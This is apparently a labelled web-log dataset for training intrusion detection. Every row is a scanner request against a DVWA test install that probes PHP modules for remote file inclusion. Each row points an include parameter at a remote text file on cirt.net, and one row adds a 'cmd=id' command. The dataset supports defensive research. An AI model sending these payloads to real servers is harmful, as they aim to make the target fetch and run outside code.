ip,identity,user,timestamp,request,status,size,referer,user_agent,vulnerability,method,url,protocol,request_length,url_parts,user_agent_length,Predicted_Vulnerability
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/NukeAI/util.php?AIbasedir=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/NukeAI/util.php?AIbasedir=http://cirt.net/public/rfiinc.txt,HTTP/1.1,108,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/PNphpBB2/includes/functions_admin.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/PNphpBB2/includes/functions_admin.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,136,12,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/SoundImporter.php?GLOBALS[ini_array][EXTLIB_PATH]=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/SoundImporter.php?GLOBALS[ini_array][EXTLIB_PATH]=http://cirt.net/public/rfiinc.txt,HTTP/1.1,132,10,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/abook/foldertree.php?baseDir==http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/abook/foldertree.php?baseDir==http://cirt.net/public/rfiinc.txt?,HTTP/1.1,113,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/addons/plugin.php?doc_root=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/addons/plugin.php?doc_root=http://cirt.net/public/rfiinc.txt,HTTP/1.1,109,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/admin/include/config.php?doc_root=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/admin/include/config.php?doc_root=http://cirt.net/public/rfiinc.txt,HTTP/1.1,116,12,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/admin/include/localize.php?doc_root=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/admin/include/localize.php?doc_root=http://cirt.net/public/rfiinc.txt,HTTP/1.1,118,12,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/agendax/addevent.inc.php?agendax_path=http://cirt.net/public/rfiinc.txt&cmd=id HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/agendax/addevent.inc.php?agendax_path=http://cirt.net/public/rfiinc.txt&cmd=id,HTTP/1.1,127,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/bank/includes/design/main.inc.php?bank_data[root]=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/bank/includes/design/main.inc.php?bank_data[root]=http://cirt.net/public/rfiinc.txt,HTTP/1.1,132,13,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/bank/includes/design/main.inc.php?bank_data[root]=http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/bank/includes/design/main.inc.php?bank_data[root]=http://cirt.net/public/rfiinc.txt?,HTTP/1.1,133,13,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/basicfog/basicfogfactory.class.php?PATH_TO_CODE=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/basicfog/basicfogfactory.class.php?PATH_TO_CODE=http://cirt.net/public/rfiinc.txt,HTTP/1.1,130,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/birstday/birst.php?exbb[home_path]=http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/birstday/birst.php?exbb[home_path]=http://cirt.net/public/rfiinc.txt?,HTTP/1.1,118,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/birstday/profile_show.php?exbb[home_path]=http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/birstday/profile_show.php?exbb[home_path]=http://cirt.net/public/rfiinc.txt?,HTTP/1.1,125,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/birstday/select.php?exbb[home_path]=http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/birstday/select.php?exbb[home_path]=http://cirt.net/public/rfiinc.txt?,HTTP/1.1,119,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/blocks/headerfile.php?system[path]=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/blocks/headerfile.php?system[path]=http://cirt.net/public/rfiinc.txt,HTTP/1.1,117,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/calendar/index.php?inc_dir=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/calendar/index.php?inc_dir=http://cirt.net/public/rfiinc.txt,HTTP/1.1,109,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/calendar/minicalendar.php?GLOBALS[rootdp]=./&GLOBALS[gsLanguage]=http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/calendar/minicalendar.php?GLOBALS[rootdp]=./&GLOBALS[gsLanguage]=http://cirt.net/public/rfiinc.txt?,HTTP/1.1,148,12,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/calendar/mod_calendar.php?absolute_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/calendar/mod_calendar.php?absolute_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,122,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/calendar/mod_calendar.php?absolute_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/calendar/mod_calendar.php?absolute_path=http://cirt.net/public/rfiinc.txt?,HTTP/1.1,123,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/certinfo/index.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/certinfo/index.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,111,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/character_roster/include.php?mod_root=http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/character_roster/include.php?mod_root=http://cirt.net/public/rfiinc.txt?,HTTP/1.1,121,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/cjaycontent/admin/editor2/spaw_control.class.php?spaw_root=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/cjaycontent/admin/editor2/spaw_control.class.php?spaw_root=http://cirt.net/public/rfiinc.txt,HTTP/1.1,141,13,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/cjaycontent/admin/editor2/spaw_control.class.php?spaw_root=http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/cjaycontent/admin/editor2/spaw_control.class.php?spaw_root=http://cirt.net/public/rfiinc.txt?,HTTP/1.1,142,13,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/coppermine/themes/default/theme.php?THEME_DIR=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/coppermine/themes/default/theme.php?THEME_DIR=http://cirt.net/public/rfiinc.txt,HTTP/1.1,128,13,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/downloads/lib/LM_Downloads.php?pathToIndex=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/downloads/lib/LM_Downloads.php?pathToIndex=http://cirt.net/public/rfiinc.txt,HTTP/1.1,125,12,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/dungeon/tick/allincludefortick.php?PATH_TO_CODE=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/dungeon/tick/allincludefortick.php?PATH_TO_CODE=http://cirt.net/public/rfiinc.txt,HTTP/1.1,130,12,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/emails/index.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/emails/index.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,109,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/events/index.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/events/index.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,109,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/fax/index.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/fax/index.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,106,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/files/blocks/latest_files.php?system[path]=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/files/blocks/latest_files.php?system[path]=http://cirt.net/public/rfiinc.txt,HTTP/1.1,125,12,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/files/index.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/files/index.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,108,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/files/list.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/files/list.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,107,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/filters/headerfile.php?system[path]=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/filters/headerfile.php?system[path]=http://cirt.net/public/rfiinc.txt,HTTP/1.1,118,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/formmailer/formmailer.admin.inc.php?BASE_DIR[jax_formmailer]=http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/formmailer/formmailer.admin.inc.php?BASE_DIR[jax_formmailer]=http://cirt.net/public/rfiinc.txt?,HTTP/1.1,144,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/forums/blocks/latest_posts.php?system[path]=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/forums/blocks/latest_posts.php?system[path]=http://cirt.net/public/rfiinc.txt,HTTP/1.1,126,12,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/global/inc/content.inc.php?sIncPath=http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/global/inc/content.inc.php?sIncPath=http://cirt.net/public/rfiinc.txt?,HTTP/1.1,119,12,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/groupadm/index.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/groupadm/index.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,111,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/groups/headerfile.php?system[path]=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/groups/headerfile.php?system[path]=http://cirt.net/public/rfiinc.txt,HTTP/1.1,117,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/guestbook/index.php?CONFIG[local_root]=http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/guestbook/index.php?CONFIG[local_root]=http://cirt.net/public/rfiinc.txt?,HTTP/1.1,122,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/history/index.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/history/index.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,110,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/home.module.php?repmod=http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/home.module.php?repmod=http://cirt.net/public/rfiinc.txt?,HTTP/1.1,106,10,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/horoscope/footer.php?xoopsConfig[root_path]=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/horoscope/footer.php?xoopsConfig[root_path]=http://cirt.net/public/rfiinc.txt,HTTP/1.1,126,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/icontent/include/wysiwyg/spaw_control.class.php?spaw_root=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/icontent/include/wysiwyg/spaw_control.class.php?spaw_root=http://cirt.net/public/rfiinc.txt,HTTP/1.1,140,13,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/info/index.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/info/index.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,107,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/links/blocks/links.php?system[path]=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/links/blocks/links.php?system[path]=http://cirt.net/public/rfiinc.txt,HTTP/1.1,118,12,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/links/showlinks.php?language_home=&rootdp=zZz&gsLanguage=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/links/showlinks.php?language_home=&rootdp=zZz&gsLanguage=http://cirt.net/public/rfiinc.txt,HTTP/1.1,139,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/links/submit_links.php?rootdp=zZz&gsLanguage=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/links/submit_links.php?rootdp=zZz&gsLanguage=http://cirt.net/public/rfiinc.txt,HTTP/1.1,127,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/log/index.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/log/index.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,106,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/mail/index.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/mail/index.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,107,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/menu/headerfile.php?system[path]=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/menu/headerfile.php?system[path]=http://cirt.net/public/rfiinc.txt,HTTP/1.1,115,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/messages/index.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/messages/index.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,111,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/mod_as_category.php?mosConfig_absolute_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,488,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/mod_as_category.php?mosConfig_absolute_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,126,10,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/mod_as_category/mod_as_category.php?mosConfig_absolute_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,488,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/mod_as_category/mod_as_category.php?mosConfig_absolute_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,142,11,115,Recon
